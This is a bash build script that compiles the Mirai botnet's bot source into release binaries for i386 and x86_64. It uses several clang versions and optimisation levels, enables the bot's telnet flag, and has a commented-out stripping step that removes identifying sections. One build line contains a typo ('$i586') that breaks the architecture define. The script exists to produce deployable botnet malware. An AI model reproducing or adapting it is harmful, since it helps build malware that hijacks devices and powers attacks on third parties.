#!/bin/bash
    for i in `seq 0 3` s
    do
        "clang-3.6" -arch i386   -std=c99 $3 bot/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"mirai-x86-clang-3.6.2-O$i" -DMIRAI_TELNET -DMIRAI_BOT_ARCH=\""i586"\"
        "clang-3.6" -arch x86_64  -std=c99 $3 bot/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"mirai-x86_64-clang-3.6.2-O$i" -DMIRAI_TELNET -DMIRAI_BOT_ARCH=\""i586"\"
        "clang-4.0" -arch i386  -std=c99 $3 bot/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"mirai-x86-clang-4.0.1-O$i" -DMIRAI_TELNET -DMIRAI_BOT_ARCH=\""i586"\"
        "clang-4.0" -arch x86_64 -std=c99 $3 bot/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"mirai-x86_64-clang-4.0.1-O$i" -DMIRAI_TELNET -DMIRAI_BOT_ARCH=\""i586"\"
        "clang-6.0" -arch i386  -std=c99 $3 bot/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"mirai-x86-clang-6.0.1-O$i" -DMIRAI_TELNET -DMIRAI_BOT_ARCH=\""$i586"\"
        "clang-6.0" -arch x86_64 -std=c99 $3 bot/*.c -O$i -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"mirai-x86_64-clang-6.0.1-O$i" -DMIRAI_TELNET -DMIRAI_BOT_ARCH=\""i586"\"
            # "$1-strip" release/"$2.gcc-O$i" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
    done